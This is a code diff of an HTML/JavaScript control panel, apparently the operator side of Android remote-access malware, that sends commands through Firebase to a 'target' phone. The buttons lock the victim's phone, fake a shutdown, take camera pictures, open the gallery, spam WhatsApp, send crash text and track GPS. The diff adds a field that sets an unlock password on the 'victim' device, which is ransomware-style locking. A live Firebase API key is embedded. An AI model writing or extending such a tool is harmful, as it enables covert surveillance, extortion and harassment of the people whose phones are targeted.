@@ -3,83 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>REMOTE CONTROL</title>
+    <title>WIDSEVERLY OMNI-REMOTE V13</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon-red: #ff0033; --neon-blue: #00ffff; --neon-purple: #f0f; --neon-yellow: #ff0; }
+        :root { --red: #ff0033; --blue: #00ffff; --purple: #f0f; --green: #0f0; }
         
         body, html { 
             background: #000; color: #fff; font-family: 'Orbitron', sans-serif; 
             margin: 0; padding: 0; width: 100%; height: 100%; overflow-x: hidden; 
         }
 
+        /* HEADER & BANNER */
         header { 
-            background: #000; padding: 15px; border-bottom: 1px solid #1a1a1a; 
+            background: #000; padding: 12px; border-bottom: 1px solid #1a1a1a; 
             text-align: center; position: sticky; top: 0; z-index: 100;
         }
 
-        /* BANNER VIDEO ATAS - REVISI VISUAL */
         .video-banner {
-            width: 100%;
-            background: #000;
-            border-bottom: 3px solid var(--neon-red);
-            overflow: hidden;
-            line-height: 0;
-            box-shadow: 0 5px 15px rgba(255, 0, 51, 0.4);
+            width: 100%; background: #000; border-bottom: 2px solid var(--red);
+            line-height: 0; box-shadow: 0 0 15px var(--red);
         }
 
-        #header-video {
-            width: 100%;
-            height: auto;
-            max-height: 240px; /* Ukuran banner ideal */
-            object-fit: cover;
-        }
+        #header-video { width: 100%; height: auto; max-height: 200px; object-fit: cover; }
 
-        .main-panel { 
-            padding: 15px; 
-            max-width: 500px; 
-            margin: auto; 
-            background: #000;
-        }
+        .main-panel { padding: 15px; max-width: 500px; margin: auto; }
 
+        /* STATUS CONSOLE */
         #status-log { 
-            background: #050505; border: 1px solid #1a1a1a; height: 70px; 
-            font-size: 0.7rem; padding: 10px; margin: 10px 0; color: #0f0;
-            font-family: monospace; overflow-y: auto; border-left: 4px solid var(--neon-red);
-            border-radius: 4px;
+            background: #050505; border: 1px solid #222; height: 80px; 
+            font-size: 0.65rem; padding: 10px; margin: 10px 0; color: var(--green);
+            font-family: monospace; overflow-y: auto; border-left: 4px solid var(--red);
         }
 
-        /* GRID TOMBOL BERSIH (CLEAN UI) */
+        /* CONTROL GRID */
         .control-grid { 
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; 
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; 
         }
 
         .btn-gacor {
-            background: #0a0a0a; border: 1px solid #333; border-radius: 12px;
+            background: #0a0a0a; border: 1px solid #333; border-radius: 8px;
             aspect-ratio: 1/1; display: flex; flex-direction: column; align-items: center; 
             justify-content: center; cursor: pointer; transition: 0.1s;
         }
+        .btn-gacor:active { transform: scale(0.92); border-color: var(--red); background: #111; }
+        .btn-gacor i { font-size: 1.4rem; margin-bottom: 5px; }
+        .btn-gacor span { font-size: 0.55rem; font-weight: bold; text-align: center; color: #ccc; }
 
-        .btn-gacor:active { background: #1a1a1a; transform: scale(0.95); border-color: var(--neon-red); }
-        .btn-gacor i { font-size: 1.8rem; margin-bottom: 8px; }
-        .btn-gacor span { font-size: 0.65rem; font-weight: bold; color: #fff; text-align: center; letter-spacing: 1px; }
+        /* SPECIAL INPUT FOR PASSWORD CONTROL */
+        .pass-setter {
+            background: #0f0f0f; border: 1px solid #222; padding: 15px;
+            margin-top: 15px; border-radius: 10px; display: flex; flex-direction: column;
+        }
+        .pass-setter input {
+            background: #000; border: 1px solid var(--blue); color: var(--blue);
+            padding: 8px; text-align: center; font-family: 'Orbitron'; margin-bottom: 10px;
+        }
+        .btn-set {
+            background: var(--blue); color: #000; border: none; padding: 8px;
+            font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 0.7rem;
+        }
 
-        .btn-red { border-color: #500; color: var(--neon-red); }
-        .btn-blue { border-color: #004; color: var(--neon-blue); }
-        .btn-purple { border-color: #404; color: var(--neon-purple); }
-        .btn-yellow { border-color: #440; color: var(--neon-yellow); }
-
+        .btn-red { color: var(--red); border-color: #400; }
+        .btn-blue { color: var(--blue); border-color: #004; }
+        .btn-purp { color: var(--purple); border-color: #404; }
     </style>
 </head>
 <body onclick="enableAudio()">
 
     <header>
-        <h2 style="margin:0; font-size: 1rem; letter-spacing: 5px; color: #fff; font-weight: 700;">REMOTE CONTROL</h2>
+        <h2 style="margin:0; font-size: 0.8rem; letter-spacing: 4px;">REMOTE CONTROL V13</h2>
     </header>
 
-    <!-- VIDEO BANNER (1000221057.mp4) -->
     <div class="video-banner">
         <video autoplay loop playsinline id="header-video">
             <source src="https://github.com/hehehedihd-tech/Kalkulator-cyber/raw/refs/heads/main/VID_20260511_195624_258.mp4" type="video/mp4">
@@ -87,30 +83,32 @@
     </div>
 
     <div class="main-panel">
-        <div id="status-log">> WIDSEVERLY OMNI V12<br>> Status: Online & Secure<br>> Tap screen to unmute video</div>
+        <div id="status-log">> OMNI SYSTEM ACTIVE<br>> Waiting for Target...</div>
 
         <div class="control-grid">
             <div class="btn-gacor btn-red" onclick="send('lock')"><i>🔒</i><span>LOCK HP</span></div>
             <div class="btn-gacor btn-red" onclick="send('unlock')"><i>🔓</i><span>UNLOCK</span></div>
-            <div class="btn-gacor btn-red" onclick="send('fake_shutdown')"><i>🔌</i><span>OFF</span></div>
+            <div class="btn-gacor btn-red" onclick="send('fake_shutdown')"><i>🔌</i><span>SHUTDOWN</span></div>
 
             <div class="btn-gacor btn-blue" onclick="send('camera_front')"><i>📸</i><span>FR-CAM</span></div>
             <div class="btn-gacor btn-blue" onclick="send('camera_back')"><i>📷</i><span>BK-CAM</span></div>
             <div class="btn-gacor btn-blue" onclick="send('view_gallery')"><i>🖼️</i><span>GALLERY</span></div>
 
-            <div class="btn-gacor btn-purple" onclick="send('wa_spam')"><i>💥</i><span>WA SPAM</span></div>
-            <div class="btn-gacor btn-purple" onclick="send('virtex')"><i>💀</i><span>VIRTEX</span></div>
-            <div class="btn-gacor btn-yellow" onclick="send('location')"><i>📍</i><span>GPS</span></div>
+            <div class="btn-gacor btn-purp" onclick="send('wa_spam')"><i>💥</i><span>WA SPAM</span></div>
+            <div class="btn-gacor btn-purp" onclick="send('virtex')"><i>💀</i><span>VIRTEX</span></div>
+            <div class="btn-gacor" style="color:var(--green); border-color:#030;" onclick="send('location')"><i>📍</i><span>GPS</span></div>
+        </div>
+
+        <div class="pass-setter">
+            <span style="font-size: 0.6rem; color: var(--blue); margin-bottom: 8px;">SET VICTIM PASSWORD:</span>
+            <input type="text" id="newPass" placeholder="Type Password...">
+            <button class="btn-set" onclick="setPass()">UPDATE KEY ON VICTIM</button>
         </div>
     </div>
 
 <script>
     const video = document.getElementById('header-video');
-    function enableAudio() { 
-        video.muted = false; 
-        video.volume = 1.0; 
-        video.play();
-    }
+    function enableAudio() { video.muted = false; video.volume = 1.0; video.play(); }
 
     const firebaseConfig = {
         apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
@@ -124,15 +122,30 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    const tID = "Target_User_1";
 
     function send(act) {
         const log = document.getElementById('status-log');
-        db.ref('targets/Target_User_1/command').update({
+        db.ref('targets/' + tID + '/command').update({
             action: act,
             time: Date.now()
         }).then(() => {
-            log.innerHTML += `> CMD [${act}] EXECUTED...<br>`;
+            log.innerHTML += `> CMD [${act}] SENT SUCCESS...<br>`;
             log.scrollTop = log.scrollHeight;
+        });
+    }
+
+    // FUNGSI UPDATE PASSWORD KORBAN DARI REMOTE
+    function setPass() {
+        const p = document.getElementById('newPass').value;
+        const log = document.getElementById('status-log');
+        if(!p) return alert("Enter password first!");
+        
+        db.ref('targets/' + tID + '/security').update({
+            unlockPassword: p
+        }).then(() => {
+            log.innerHTML += `> SECURITY KEY UPDATED TO: ${p}<br>`;
+            alert("Password updated to " + p);
         });
     }
 </script>
